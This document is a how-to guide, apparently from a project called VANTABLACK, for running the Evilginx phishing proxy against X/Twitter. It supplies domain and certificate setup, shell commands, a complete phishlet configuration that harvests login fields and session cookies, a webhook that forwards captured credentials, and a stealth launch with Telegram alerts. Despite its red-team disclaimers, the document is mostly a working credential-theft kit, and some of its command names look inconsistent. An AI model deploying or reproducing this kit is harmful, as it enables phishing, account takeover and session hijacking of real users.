# Evilginx Guide for X (Twitter)

This guide explains how to use Evilginx to intercept X/Twitter credentials.

## ⚠️ LEGAL DISCLAIMER

**This tool is intended for authorized Red Team operations only.** Unauthorized use without prior written consent is illegal and may result in criminal prosecution.

---

## 1. Prerequisites

### Configured Domain
You must own a domain pointing to your server:
```
A record    @    YOUR_IP
*.your-domain.com  -> YOUR_IP
```

### SSL Certificates
Generate certificates via Let's Encrypt:
```bash
certbot certonly --standalone -d your-domain.com -d *.your-domain.com
```

### Open Ports
- 443 (HTTPS) - Evilginx Server
- 53 (DNS) - Domain resolution

---

## 2. Launch Evilginx

```bash
# Start Evilginx with phishlets
cd /Users/pro/SaaS/Vantablack
./bin/evilginx -p ./phishlets
```

---

## 3. Configuration in Evilginx

Once the Evilginx shell opens:

```bash
# Set the domain
config domain your-domain.com

# Set redirect IPs (your server)
config ip YOUR_IP

# List available phishlets
phishlets

# Enable the X (Twitter) phishlet
phishlets enable twitter
```

---

## 4. Create Phishing Link

```bash
# Generate phishing URL for X
landers create twitter

# You'll get a URL like:
# https://your-vps-ip/twitter/login?ref=xxxxx

# OR with your configured domain:
# https://login.your-domain.com/twitter/login
```

### Lure Options

```bash
# Create with custom lure
landers create twitter -name "X Verification"

# List active landers
landers
```

---

## 5. Capture Credentials

### Passive Mode (Auto Collection)

```bash
# Start Evilginx server
server

# Credentials will appear automatically
sessions

# Details of a session
sessions 1
```

### JSON Output for Automation

```bash
# Enable webhook
config webhook_url http://127.0.0.1:8000/capture

# Data is sent as JSON:
{
  "id": "session_123",
  "phishlet": "twitter",
  "username": "victim@example.com",
  "password": "password123",
  "tokens": {
    "auth_token": "xxx",
    "ct0": "yyy",
    "twid": "zzz"
  },
  "timestamp": "2024-01-15T10:30:00Z",
  "ip": "192.168.1.100"
}
```

---

## 6. X Phishlet Structure (twitter.yaml)

```yaml
min_ver: '3.0.0'

# Proxy hosts
proxy_hosts:
  # Main page (landing)
  - {phish_sub: 'twitter', orig_sub: 'twitter', domain: 'x.com', session: true, is_landing: true}
  # X API
  - {phish_sub: 'api', orig_sub: 'api', domain: 'x.com', session: true, is_landing: false}

# Substitution filters
sub_filters:
  # Replace X URLs with your server
  - {triggers_on: 'twitter.x.com', orig_sub: 'twitter', domain: 'x.com', 
     search: 'https://x.com/', replace: 'https://{hostname}/', 
     mimes: ['text/html', 'application/javascript']}

# Session tokens to capture
auth_tokens:
  - domain: '.x.com'
    keys: ['auth_token', 'ct0', 'twid', 'personalization_id']

# Credential fields
credentials:
  username:
    key: 'session[username_or_email]'
    search: '(.*)'
    type: 'post'
  password:
    key: 'session[password]'
    search: '(.*)'
    type: 'post'

# Login page
login:
  domain: 'twitter.x.com'
  path: '/login'
```

---

## 7. Complete Evilginx Commands

| Command | Description |
|---------|-------------|
| `config domain [domain]` | Set phishing domain |
| `config ip [IP]` | Set server IP |
| `config webhook_url [URL]` | Configure webhook |
| `phishlets` | List phishlets |
| `phishlets enable [name]` | Enable a phishlet |
| `phishlets disable [name]` | Disable a phishlet |
| `landers` | List landing pages |
| `landers create [name]` | Create landing page |
| `landers remove [ID]` | Remove landing page |
| `sessions` | List captured sessions |
| `sessions [ID]` | Session details |
| `sessions remove [ID]` | Remove a session |
| `server start` | Start server |
| `server stop` | Stop server |
| `help` | Help |
| `quit` | Exit |

---

## 8. Integration with VANTABLACK

For advanced usage with the VANTABLACK orchestrator:

```bash
# Launch complete infrastructure
docker-compose up -d

# Or direct start with stealth
sudo python3 vanta.py --stealth-level 3 --notify telegram

# In another terminal, start Evilginx
./bin/evilginx -p ./phishlets -developer -webhook-url http://127.0.0.1:8000/capture
```

### Capture Monitoring

```bash
# Real-time monitoring
python3 monitor_captures.py
```

---

## 9. Common X Phishing URLs

| Original URL | Phishing URL |
|--------------|--------------|
| x.com/login | your-domain.com/twitter/login |
| x.com/i/flow/login | your-domain.com/twitter/i/flow/login |

---

## 10. Troubleshooting

### Phishlet Won't Load
```bash
# Check DNS configuration
dig your-domain.com

# Check ports
netstat -tulpn | grep -E '443|53'
```

### Expired Certificates
```bash
# Renew certificates
certbot renew

# Restart Evilginx
```

### No Captures
```bash
# Check Evilginx logs
# (Ctrl+C to exit, then ./bin/evilginx again)

# Test connectivity
curl https://your-domain.com/twitter/login
```

---

## ⚖️ Disclaimer

**USE STRICTLY LIMITED TO AUTHORIZED RED TEAM OPERATIONS.**

- Obtain written contract before any use
- Never use on targets without consent
- Respect local laws
- Keep records of your authorization

---

**VANTABLACK: Through the Looking Glass of Security.**
